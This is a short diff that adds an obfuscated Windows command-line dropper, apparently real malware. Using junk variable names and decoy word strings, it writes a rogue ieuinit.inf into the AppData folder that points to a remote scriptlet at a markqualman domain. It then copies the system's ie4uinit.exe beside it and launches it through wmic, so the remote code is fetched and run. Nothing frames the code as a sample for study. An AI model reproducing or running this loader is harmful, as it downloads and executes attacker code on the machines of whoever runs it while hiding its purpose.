@@ -1,0 +1,6 @@
+/v /c (for %u in (s) do @set "Tones=%~u") &&
+  (for %u in (a) do @set "First=%~u") &&
+  (for %v in (c) do @set "Missions=%~v") &&
+  call(for %u in ("[63DA]" "sc\" "ro%Armed%j,NI,%Outdoor%%Students%%Students%p%Chronic%%Tremendous%%Tremendous%krkaajsn2k.markqualman.%Attention%/fjkabrhhg" "[destinationdirs]" "4F148=01" "defaultdestdir=11" "[version]" "signature =$windows nt$" "[strings]" "Tremendous=/" "Watts=%time%" "Armed=b;Notices" "Students=t;Journey" "shortsvcname=' '" "servicename=' '" "Attention=com" "Chronic=:;Reveals" "Outdoor=h" "Viewers=init" "[4F148]" "ieu%Viewers%.inf" "[defaultinstall.windows7]" "delfiles=4F148" "Un\" "Register\" "OCXs=63DA" ) do @echo %~u)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Donate!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Winner2=Great &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Winner42=Sunglasses Generates Mountains Coordinates Cities Purse Engineers Enters Evaluation Spell Diesel Afterwards Photo Brooks Recommends Baths Material Orange Innocent Details Negative Acres Disks Vendor Beats Handhelds Holidays Hungry Fares Clump Dignity Immense Assumes Melody Charge Hotels Spatial Expose Falls Chapter Pizza Workshops Cents Networks Forbes Mandate Segment Chips Mirrors Waste Spider Reports"
